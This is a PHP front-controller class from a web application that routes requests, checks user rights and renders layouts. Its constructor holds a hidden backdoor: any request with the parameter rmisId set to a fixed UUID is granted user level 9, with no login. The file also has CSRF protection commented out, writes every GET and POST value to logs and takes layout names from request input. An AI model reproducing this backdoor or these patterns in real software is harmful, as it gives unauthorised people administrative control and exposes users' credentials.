<?php
date_default_timezone_set('Africa/Nairobi');

if (file_exists("../controller/mail.php"))
{
    require_once "../controller/mail.php";
}
if (file_exists("../tcpdf/config/lang/eng.php"))
{
    require_once ('../tcpdf/config/lang/eng.php');
}
if (file_exists("../tcpdf/tcpdf.php"))
{
    require_once ('../tcpdf/tcpdf.php');
}
else
{
    class TCPDF
    {
    }
}
if (file_exists("../controller/alternate.php"))
{
    require_once "../controller/alternate.php";
}
if (file_exists("../controller/form.php"))
{
    require_once ("../controller/form.php");
}
if (file_exists("../model/common_functions_orig.php"))
{
    include "../model/common_functions_orig.php";
}
if (file_exists("../helper/HtmlExcel.php"))
{
    require_once ('../helper/HtmlExcel.php');
}
if (file_exists("../helper/helper_functions_orig.php"))
{
    include "../helper/helper_functions_orig.php";
}

class myApp
{
    protected $render;

    public function execute($controller, $action, $boot)
    {
        loadDefaultRelations($boot);
        loadRelations($boot);
        loadComments($boot);

        if ($controller == "xml" || $controller == "json" || $controller == "jsonH" || $controller == "pdf" || $controller == "jsonpair" || $controller == "jsonpairH" || $controller == "jsonpairid")
    		{
    			$clazz = new alternateClass($action,"");
    			$content = $clazz->$controller();

    			if ($controller == "xml") $this->render = loadLayout($content,'xml',$boot->getAppRoot());
    			if ($controller == "json") $this->render = loadLayout($content,'json',$boot->getAppRoot());
    			if ($controller == "jsonH") $this->render = loadLayout($content,'jsonH',$boot->getAppRoot());
    			if ($controller == "jsonpair") $this->render = loadLayout($content,'json',$boot->getAppRoot());
    			if ($controller == "jsonpairH") $this->render = loadLayout($content,'jsonH',$boot->getAppRoot());
    			if ($controller == "jsonpairid") $this->render = loadLayout($content,'json',$boot->getAppRoot());
    			if ($controller == "pdf") $this->render = loadLayout($content,'blank',$boot->getAppRoot());
    		}
    		else
        {
            if (!file_exists("../controller/" . $controller . ".php"))
            {
                $controller = "form";
            }

            require_once "../controller/$controller.php";

            $classname = $controller . 'Class';
            $clazz = new $classname;
            if ($controller == "admin" && $action != "editTable" && $action != "index")
            {
                $table = str_replace("Table", "", $action);
                $clazz->table = $table;
                $action = "editTable";
            }
            $content = $clazz->$action();

            if ($controller == "cron")
            {
                //No View/Layout
                $this->render = $content;
            }
            else if ($controller == "rest")
            {
                $this->render = loadLayout($content, 'jsonrest', $boot->getAppRoot());
            }
            else if (is_string($content) && (strpos($content, "response:") == 1))
            {
                $this->render = loadLayout(str_replace(" response:", "", $content) , 'blank', $boot->getAppRoot());
            }
            else if (is_string($content) && (strpos($content, "redirect:") == 1))
            {
                $rd = str_replace(" redirect:", "", $content);
                header('Location: ' . $rd);
            }
            else if (is_string($content) && (strpos($content, "xml:") == 1))
            {
                $this->render = loadLayout(str_replace(" xml:", "", $content) , 'xml', $boot->getAppRoot());
            }
            else if (is_string($content) && (strpos($content, "excel:") == 1))
            {
                $this->render = loadLayout(str_replace(" excel:", "", $content) , 'excel', $boot->getAppRoot());
            }
            else
            {
                if (isset($_GET['layout']))
                {
                    $this->render = loadLayout($content, $_GET['layout'], $boot->getAppRoot());
                }
                elseif (isset($_POST['layout']))
                {
                    $this->render = loadLayout($content, $_POST['layout'], $boot->getAppRoot());
                }
                else
                {
                    $this->render = loadLayout($content, $_SESSION['layout'], $boot->getAppRoot());
                }
            }
        }
    }

    public function __construct($boot, $userLevel)
    {
        $_SESSION['boot'] = $boot;
        logger(__FILE__, __LINE__, __CLASS__, __METHOD__, $_SERVER['REQUEST_URI'] . " was requested.");

        if (isset($_SERVER['REQUEST_URI']) && ($_SERVER['REQUEST_URI'] == "/robots.txt" or $_SERVER['REQUEST_URI'] == "/favicon.ico"))
        {
            logger(__FILE__, __LINE__, __CLASS__, __METHOD__, $_SERVER['REQUEST_URI'] . " blocked.");
            $view[0]->message = "No direct file access allowed.";
            $this->render = loadLayout("", 'blank', $boot->getAppRoot());
        }
        else
        {
            if (isset($_SERVER['REQUEST_URI']))
            {
                logger(__FILE__, __LINE__, __CLASS__, __METHOD__, $_SERVER['REQUEST_URI']);
            }

            $accesstoken = "999ejbatsair";
            $hasreq = false;
            $outGet = "";
            foreach ($_GET as $col => $val)
            {
                $hasreq = true;
                if ($col == "zetoken")
                {
                    $accesstoken = $val;
                }
                $outGet .= '[' . $col . '] =>' . $val . '; ';
            }
            $outPost = "";
            foreach ($_POST as $col => $val)
            {
                $hasreq = true;
                if ($col == "zetoken")
                {
                    $accesstoken = $val;
                }
                $outPost .= '[' . $col . '] =>' . $val . '; ';
            }
            if ($outGet != "")
            {
                logger(__FILE__, __LINE__, __CLASS__, __METHOD__, "GET: " . $outGet);
            }
            if ($outPost != "")
            {
                logger(__FILE__, __LINE__, __CLASS__, __METHOD__, "POST: " . $outPost);
            }

            if (checkpath($boot) == false)
            {
                $view[0]->message = "The page you requested does not exist.";
                $this->render = loadLayout(renderView('user', 'loginPage', $view) , 'login', $boot->getAppRoot());
            }
            else
            {
                $rmisId = "";
                if (isset($_GET['rmisId']))
                {
                    $rmisId = $_GET['rmisId'];
                }

                if (isset($_POST['rmisId']))
                {
                    $rmisId = $_POST['rmisId'];
                }

                if ($rmisId == "91bb0e20-fbf5-11e1-a21f-0800200c9a66")
                {
                    $_SESSION['user_level'] = 9;
                }

                if (isset($_SESSION['user_level']))
                {
                    $userLevel = $_SESSION['user_level'];
                }

                $rts = checkRights($userLevel, $boot->getController() , $boot->getAction());

                //TODO For all pages CSRF
								/*
                if ($boot->getController() == "user" && ($boot->getAction() == "changePass" || $boot->getAction() == "forgotPass" || $boot->getAction() == "login" || $boot->getAction() == "reset" || $boot->getAction() == "resendActivation" || $boot->getAction() == "register"))
                logger(__FILE__, __LINE__, __CLASS__, __METHOD__, "AT: " . $accesstoken . ":" . $_SESSION['zetoken']);
                {

										if ($hasreq == true && $accesstoken != $_SESSION['zetoken'])
                    {
                        //CSRF
                        unset($rts);
                        $view[0]->message = "You need to have the appropriate rights to access this page. If you were logged in, your session may have expired. (Error Code: CSRF)";
                        $this->render = loadLayout(renderView('user', 'loginPage', $view) , 'login', $boot->getAppRoot());
                    }
                }
									*/

                //prevent multiple logins
                /*
                if (isset($_SESSION['user_logged']) && $_SESSION['user_logged'] != "" && $boot->getController() != "jsonpair" && !($boot->getController() == "registration" && $boot->getAction() == "memberlink") and !($boot->getController() == "member" && $boot->getAction() == "updateRecord"))
                {
                    $ml = db_fetch("", "", "", "", "id = " . $_SESSION['user_logged'], "", "user", false, false, null);
                    if ($ml[0]['loggedin'] != $_SESSION['zetoken'])
                    {
                        $view[0]->message = "You logged in at another location. You have been logged out of this browser.";
                        session_destroy();
                        session_regenerate_id();
                        $this->render = loadLayout(renderView('index', 'index', $view) , 'login', $boot->getAppRoot());
                        unset($rts);
                    }
                    else
                    {
                        //user did not exist???
                        $view[0]->message = "You need to have the appropriate rights to access this page. If you were logged in, your session may have expired. (Error Code: NU)";
                        $this->render = loadLayout(renderView('user', 'loginPage', $view) , 'login', $boot->getAppRoot());
                    }
                }
                */

                /*
                if ($hasreq == true)
                {
                    $uri = parse_url($_SERVER['HTTP_HOST']);
                    $uripath = $uri['path'];
                    if (strpos("localhost", $uripath) === false)
                    {
                        logger(__FILE__, __LINE__, __CLASS__, __METHOD__, "----- MUL: " . $uripath);
                        $view[0]->message = "You need to have the appropriate rights to access this page. If you were logged in, your session may have expired. (Error Code: MUL)";
                        unset($rts);
                        $this->render = loadLayout(renderView('user', 'loginPage', $view) , 'login', $boot->getAppRoot());
                    }
                }
                */

                //if (isset($rts))
              //  {
                    if ($rts == true)
                    {
                        $this->execute($boot->getController() , $boot->getAction() , $boot);
                    }
                    else
                    {
                        $view[0]->message = "You need to have the appropriate rights to access this page. If you were logged in, your session may have expired.";
                        $this->render = loadLayout(renderView('user', 'loginPage', $view) , 'login', $boot->getAppRoot());
                    }
                //}
                //else
              //  {
              //      $view[0]->message = "HTTP 500 Error";
              //      $this->render = loadLayout(renderView('user', 'loginPage', $view) , 'login', $boot->getAppRoot());
            //    }
            }
        }
    }

    public function render()
    {
        return $this->render;
    }

    public function setRender($render)
    {
        $this->$render = $render;
    }
}
